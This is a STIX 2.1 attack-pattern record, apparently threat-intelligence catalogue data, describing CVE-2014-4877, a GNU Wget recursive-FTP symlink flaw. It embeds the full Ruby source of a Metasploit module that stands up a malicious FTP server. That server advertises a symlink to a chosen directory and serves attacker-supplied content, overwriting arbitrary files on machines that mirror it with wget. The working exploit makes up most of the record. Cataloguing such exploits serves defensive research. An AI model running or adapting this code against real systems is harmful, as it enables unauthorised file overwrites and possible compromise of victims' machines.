{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7857b4c-06f7-4835-9f58-bda031a8dd6a",
    "created": "2024-08-14T16:21:58.873689Z",
    "modified": "2024-08-14T16:21:58.873692Z",
    "name": "GNU Wget FTP Symlink Arbitrary Filesystem Access",
    "description": " This module exploits a vulnerability in Wget when used in recursive (-r) mode with a FTP server as a destination. A symlink is used to allow arbitrary writes to the target's filesystem. To specify content for the file, use the \"file:/path\" syntax for the TARGET_DATA option.  Tested successfully with wget 1.14. Versions prior to 1.16 are presumed vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/wget_symlink_file_write.rb",
            "external_id": "wget_symlink_file_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4877"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1139181"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'GNU Wget FTP Symlink Arbitrary Filesystem Access',\n      'Description'    => %q{\n        This module exploits a vulnerability in Wget when used in\n        recursive (-r) mode with a FTP server as a destination. A\n        symlink is used to allow arbitrary writes to the target's\n        filesystem. To specify content for the file, use the\n        \"file:/path\" syntax for the TARGET_DATA option.\n\n        Tested successfully with wget 1.14. Versions prior to 1.16\n        are presumed vulnerable.\n      },\n      'Author'         => ['hdm'],\n      'License'        => MSF_LICENSE,\n      'Actions'        => [['Service', 'Description' => 'Run malicious FTP server']],\n      'PassiveActions' => ['Service'],\n      'References'     =>\n        [\n          [ 'CVE', '2014-4877'],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1139181' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access' ]\n        ],\n      'DefaultAction'  => 'Service',\n      'DisclosureDate' => 'Oct 27 2014'\n    )\n\n    register_options(\n      [\n        OptString.new('TARGET_FILE', [ true,  \"The target file to overwrite\", '/tmp/pwned' ]),\n        OptString.new('TARGET_DATA', [ true,  \"The data to write to the target file\", 'Hello from Metasploit' ]),\n        OptPort.new('SRVPORT', [ true, \"The port for the malicious FTP server to listen on\", 2121])\n      ])\n\n      @fakedir = Rex::Text.rand_text_alphanumeric(rand(8)+8)\n  end\n\n  def run\n    my_address = Rex::Socket.source_address\n    print_good(\"Targets should run: $ wget -m ftp://#{my_address}:#{datastore['SRVPORT']}/\")\n    exploit()\n  end\n\n  def on_client_command_user(c,arg)\n    @state[c][:user] = arg\n    c.put \"331 User name okay, need password...\\r\\n\"\n  end\n\n  def on_client_command_pass(c,arg)\n    @state[c][:pass] = arg\n    c.put \"230 Login OK\\r\\n\"\n    @state[c][:auth] = true\n    print_status(\"#{@state[c][:name]} Logged in with user '#{@state[c][:user]}' and password '#{@state[c][:user]}'...\")\n  end\n\n  def on_client_command_retr(c,arg)\n    print_status(\"#{@state[c][:name]} -> RETR #{arg}\")\n\n    if not @state[c][:auth]\n      c.put \"500 Access denied\\r\\n\"\n      return\n    end\n\n    unless arg.index(::File.basename(datastore['TARGET_FILE']))\n      c.put \"550 File does not exist\\r\\n\"\n      return\n    end\n\n    conn = establish_data_connection(c)\n    if not conn\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    c.put(\"150 Opening BINARY mode data connection for #{arg}\\r\\n\")\n    conn.put(datastore['TARGET_DATA'])\n    c.put(\"226 Transfer complete.\\r\\n\")\n    conn.close\n\n    print_good(\"#{@state[c][:name]} Hopefully wrote #{datastore['TARGET_DATA'].length} bytes to #{datastore['TARGET_FILE']}\")\n  end\n\n  def on_client_command_list(c,arg)\n\n    print_status(\"#{@state[c][:name]} -> LIST #{arg}\")\n\n    if not @state[c][:auth]\n      c.put \"500 Access denied\\r\\n\"\n      return\n    end\n\n    conn = establish_data_connection(c)\n    if not conn\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    pwd = @state[c][:cwd]\n    buf = ''\n\n    dstamp = Time.at(Time.now.to_i-((3600*24*365)+(3600*24*(rand(365)+1)))).strftime(\"%b %e  %Y\")\n    unless pwd.index(@fakedir)\n      buf << \"lrwxrwxrwx   1 root     root           33 #{dstamp} #{@fakedir} -> #{::File.dirname(datastore['TARGET_FILE'])}\\r\\n\"\n      buf << \"drwxrwxr-x  15 root     root         4096 #{dstamp} #{@fakedir}\\r\\n\"\n    else\n      buf << \"-rwx------   1 root     root    #{\"%9d\" % datastore['TARGET_DATA'].length} #{dstamp} #{::File.basename(datastore['TARGET_FILE'])}\\r\\n\"\n    end\n\n    c.put(\"150 Opening ASCII mode data connection for /bin/ls\\r\\n\")\n    conn.put(\"total #{buf.length}\\r\\n\" + buf)\n    c.put(\"226 Transfer complete.\\r\\n\")\n    conn.close\n  end\n\n  def on_client_command_size(c,arg)\n\n    if not @state[c][:auth]\n      c.put \"500 Access denied\\r\\n\"\n      return\n    end\n\n    c.put(\"213 #{datastore['TARGET_DATA'].length}\\r\\n\")\n  end\n\n\n  def on_client_command_cwd(c,arg)\n\n    print_status(\"#{@state[c][:name]} -> CWD #{arg}\")\n\n    if not @state[c][:auth]\n      c.put \"500 Access denied\\r\\n\"\n      return\n    end\n\n    upath = \"/\"\n    npath = ::File.join(@state[c][:cwd], arg)\n    bpath = npath[upath.length, npath.length - upath.length]\n\n    # Check for traversal above the root directory\n    if not (npath[0, upath.length] == upath or bpath == '')\n      bpath = '/'\n    end\n\n    bpath = '/' if bpath == ''\n    @state[c][:cwd] = bpath\n\n    c.put \"250 CWD command successful.\\r\\n\"\n  end\nend\n",
    "x_mitre_disclosure_date": "Oct 27 2014"
}